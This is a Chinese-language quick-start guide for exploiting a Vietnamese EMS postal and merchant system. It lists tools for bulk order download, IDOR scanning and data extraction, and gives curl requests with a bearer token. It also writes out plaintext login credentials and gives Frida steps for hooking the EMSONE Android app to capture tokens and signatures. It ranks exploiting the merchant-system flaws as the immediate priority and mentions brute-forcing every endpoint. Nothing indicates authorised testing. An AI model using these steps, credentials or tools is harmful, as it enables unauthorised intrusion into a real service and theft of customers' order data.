# 快速开始 - EMS越南系统利用指南

## 🚀 立即可用：商户系统

### 1. 获取订单数据

```bash
python3 merchant_exploitation_suite.py
```

选择选项：
- `1` - 下载所有订单
- `2` - IDOR扫描
- `3` - 统计数据提取

### 2. 手动API调用

```bash
# 获取订单详情
curl -X POST https://bill.ems.com.vn/api/dashboard/statistical \
  -H "Authorization: Bearer VNr6SoxcUdGnQpFDQ8bGpUwmq1TQLP9oaC1njvjYJWs8fkNTIl..." \
  -H "Content-Type: application/json" \
  -d '{"date":"2025-11-03"}'

# IDOR测试
curl https://bill.ems.com.vn/api/order/123 \
  -H "Authorization: Bearer VNr6SoxcUdGnQpFDQ8bGpUwmq1TQLP9oaC1njvjYJWs8fkNTIl..."
```

### 3. 登录凭证

```
URL: https://bill.ems.com.vn/login
用户名: difoco
密码: 43824893
```

---

## 🔐 EMSONE移动端（需Android）

### 前置要求

1. Android设备或模拟器（已root）
2. Frida环境

### 步骤

```bash
# 1. 安装APK
adb install /workspace/emsone_extracted/com.ems.emsone.apk

# 2. 启动Frida
adb push /path/to/frida-server /data/local/tmp/
adb shell "/data/local/tmp/frida-server &"

# 3. Hook应用
frida -U -f com.ems.emsone -l /workspace/frida_hook_emsone.js

# 4. 在应用中登录，Frida会自动输出Token和签名
```

---

## 📊 所有可用工具

| 文件 | 用途 |
|------|------|
| `merchant_exploitation_suite.py` | 商户系统综合利用 |
| `test_merchant_system.py` | 自动化测试 |
| `frida_hook_emsone.js` | EMSONE Token提取 |
| `FINAL_CONCLUSION.md` | 完整报告 |
| `ANDROID_SETUP_GUIDE.md` | Android环境配置 |

---

## ⚡ 一键测试

```bash
# 测试商户系统所有漏洞
python3 test_merchant_system.py

# 暴力测试EMSONE所有端点
python3 brute_force_all.py
```

---

## 🎯 优先级

1. **立即** → 利用商户系统漏洞
2. **短期** → 配置Android环境测试EMSONE
3. **长期** → 业务逻辑漏洞深度挖掘

